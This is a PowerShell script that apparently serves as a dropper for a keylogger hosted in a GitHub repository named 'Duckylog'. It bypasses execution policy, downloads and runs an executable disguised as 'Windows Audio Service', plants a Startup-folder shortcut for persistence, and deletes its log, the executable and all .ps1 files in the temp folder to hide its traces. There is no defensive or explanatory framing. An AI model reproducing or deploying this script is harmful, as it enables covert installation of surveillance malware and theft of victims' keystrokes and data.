# Set Execution Policy
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force

# Define the path to the Startup folder
$startupFolderPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs\Startup')

# Define the path for the shortcut
$shortcutPath = [System.IO.Path]::Combine($startupFolderPath, 'Windows Audio Services.lnk')

# Function to check for an active network connection
function Test-NetworkConnection {
    $pingResult = Test-Connection -ComputerName google.com -Count 1 -Quiet
    return $pingResult
}

# Wait for an active network connection
while (-Not (Test-NetworkConnection)) {
    Start-Sleep -Seconds 5
}

# Check if the shortcut exists
if (-Not (Test-Path $shortcutPath)) {
    # Path to the executable
    $exePath = "$env:TEMP\Windows Audio Service.exe"

    # URL to the executable on GitHub
    $exeUrl = "https://github.com/Mocipie/Duckylog/raw/main/Windows%20Audio%20Service.exe"

    # Download the executable from GitHub
    Invoke-WebRequest -Uri $exeUrl -OutFile $exePath

    # Create a WScript.Shell COM object
    $wshShell = New-Object -ComObject WScript.Shell

    # Create the shortcut
    $shortcut = $wshShell.CreateShortcut($shortcutPath)
    $shortcut.TargetPath = $exePath
    $shortcut.WorkingDirectory = [System.IO.Path]::GetDirectoryName($exePath)
    $shortcut.Save()
}

# Function to clean up PowerShell scripts in the temp directory
function Cleanup-TempScripts {
    Get-ChildItem -Path ([System.IO.Path]::GetTempPath()) -Filter "*.ps1" -File | Remove-Item -Force
}

# Trap to handle script termination and perform cleanup
trap { Cleanup-TempScripts; break }

$logFilePath = "$env:TEMP\log.txt"

if (-Not (Test-Path $logFilePath)) { New-Item -Path $logFilePath -ItemType File }

try {
    # Run the executable
    $exeProcess = Start-Process -FilePath $exePath -NoNewWindow -PassThru
    $exeProcess.WaitForExit()
}
finally {
    if (Test-Path $logFilePath) { Remove-Item -Path $logFilePath }
    
    # Remove the shortcut if it exists
    if (Test-Path $shortcutPath) {
        Remove-Item -Path $shortcutPath -Force
    }

    # Remove the executable if it exists
    if (Test-Path $exePath) {
        Remove-Item -Path $exePath -Force
    }

    Cleanup-TempScripts
}

# Ensure the script terminates last
Start-Sleep -Seconds 2

# Exit the PowerShell session
exit
